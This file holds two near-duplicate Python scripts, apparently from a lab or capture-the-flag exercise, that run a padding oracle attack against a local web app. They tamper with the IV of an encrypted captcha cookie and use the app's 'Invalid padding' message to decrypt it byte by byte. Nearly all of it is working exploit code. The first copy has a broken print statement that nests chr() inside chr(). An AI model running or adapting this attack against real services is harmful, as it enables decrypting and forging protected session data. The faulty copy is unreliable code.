import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid, False if "Invalid padding"
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False  # Invalid padding
        return True  # Valid padding (could be Invalid CAPTCHA! or success)
    except:
        return None

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)
i0 = bytearray(ciphertext[:BLOCK_SIZE])  # IV
i1 = bytearray(ciphertext[BLOCK_SIZE:])  # Block 1 (skip remaining if more, but we have 2 blocks)

print(f"[*] Starting padding oracle attack")
print(f"[*] IV: {i0.hex()}")
print(f"[*] Block1: {i1.hex()}")

# Plaintext buffer for Block 1
decrypted = bytearray(BLOCK_SIZE)

# For each byte position from last to first
for pos in range(BLOCK_SIZE - 1, -1, -1):
    # Expected padding value for this position
    pad_val = BLOCK_SIZE - pos
    
    print(f"\n[*] Decrypting byte {pos} (expecting padding 0x{pad_val:02x})")
    
    candidates = []
    
    for test_byte in range(256):
        # Create modified IV
        c0 = bytearray(i0)
        
        # For already decrypted bytes, set up the padding
        for i in range(pos + 1, BLOCK_SIZE):
            c0[i] = i0[i] ^ decrypted[i] ^ pad_val
        
        # Set the test byte
        c0[pos] = i0[pos] ^ test_byte ^ pad_val
        
        # Test
        modified_cipher = bytes(c0) + bytes(i1)
        modified_b64 = base64.b64encode(modified_cipher).decode()
        
        if test_oracle(session, modified_b64, csrf_token):
            candidates.append(test_byte)
            print(f"  [+] Found: 0x{test_byte:02x} ({chr(test_byte) if 32 <= test_byte < 127 else '?'}) - {chr(chr(test_byte) if 32 <= test_byte < 127 else '?')}")
    
    if len(candidates) == 1:
        decrypted[pos] = candidates[0]
        print(f"  [+] Unique solution: 0x{candidates[0]:02x} = '{chr(candidates[0])}'")
    elif len(candidates) == 0:
        print(f"  [-] No valid candidate found!")
        break
    else:
        # Multiple candidates - need to determine which one
        # Usually the first one with valid printable ASCII or based on expected plaintext
        print(f"  [?] Multiple candidates: {candidates}")
        decrypted[pos] = candidates[0]

print(f"\n[+] Decrypted block: {decrypted.hex()}")
print(f"[+] As string: {decrypted.decode('latin-1')}")

# Try to print as readable text
try:
    text = decrypted.decode('ascii')
    print(f"[+] ASCII text: '{text}'")
except:
    print(f"[+] Hex: {decrypted.hex()}")
    print(f"[+] Latin-1: {decrypted.decode('latin-1')}")


import requests
import base64
import re

base_url = "http://127.0.0.1:33002"
BLOCK_SIZE = 16

def test_oracle(session, modified_captcha_b64, csrf_token):
    """
    Returns True if padding is valid, False if "Invalid padding"
    """
    session.cookies.set('captcha', modified_captcha_b64, domain='127.0.0.1', path='/')
    
    data = {
        'csrf_token': csrf_token,
        'username': 'oracle_test',
        'captcha': '12345',
        'submit': 'Create User'
    }
    
    try:
        resp = session.post(f"{base_url}/", data=data, allow_redirects=True)
        if "Invalid padding" in resp.text:
            return False  # Invalid padding
        return True  # Valid padding (could be Invalid CAPTCHA! or success)
    except:
        return None

# Get CSRF token
session = requests.Session()
resp = session.get(f"{base_url}/")
csrf_match = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', resp.text)
csrf_token = csrf_match.group(1) if csrf_match else ""

# Use the provided captcha
captcha_b64 = "hWlOzGJIEXjbBbkpSz/JN6UCPymOe4OA6y9SOuLnis0="
ciphertext = base64.b64decode(captcha_b64)
i0 = bytearray(ciphertext[:BLOCK_SIZE])  # IV
i1 = bytearray(ciphertext[BLOCK_SIZE:])  # Block 1

print(f"[*] Starting padding oracle attack")
print(f"[*] IV: {i0.hex()}")
print(f"[*] Block1: {i1.hex()}")

# Plaintext buffer for Block 1
decrypted = bytearray(BLOCK_SIZE)

# For each byte position from last to first
for pos in range(BLOCK_SIZE - 1, -1, -1):
    # Expected padding value for this position
    pad_val = BLOCK_SIZE - pos
    
    print(f"\n[*] Byte {pos} (padding 0x{pad_val:02x}): ", end="")
    
    candidates = []
    
    for test_byte in range(256):
        # Create modified IV
        c0 = bytearray(i0)
        
        # For already decrypted bytes, set up the padding
        for i in range(pos + 1, BLOCK_SIZE):
            c0[i] = i0[i] ^ decrypted[i] ^ pad_val
        
        # Set the test byte
        c0[pos] = i0[pos] ^ test_byte ^ pad_val
        
        # Test
        modified_cipher = bytes(c0) + bytes(i1)
        modified_b64 = base64.b64encode(modified_cipher).decode()
        
        if test_oracle(session, modified_b64, csrf_token):
            candidates.append(test_byte)
            char = chr(test_byte) if 32 <= test_byte < 127 else f"\\x{test_byte:02x}"
            print(f"{test_byte}", end=" ")
    
    print("")
    
    if len(candidates) == 1:
        decrypted[pos] = candidates[0]
        char = chr(candidates[0]) if 32 <= candidates[0] < 127 else f"\\x{candidates[0]:02x}"
        print(f"  [+] Unique: {char}")
    elif len(candidates) > 1:
        print(f"  [?] Multiple: {candidates} (using first)")
        decrypted[pos] = candidates[0]
    else:
        print(f"  [-] No candidate!")
        break

print(f"\n[+] Decrypted block: {decrypted.hex()}")
print(f"[+] As string: {decrypted.decode('latin-1')}")

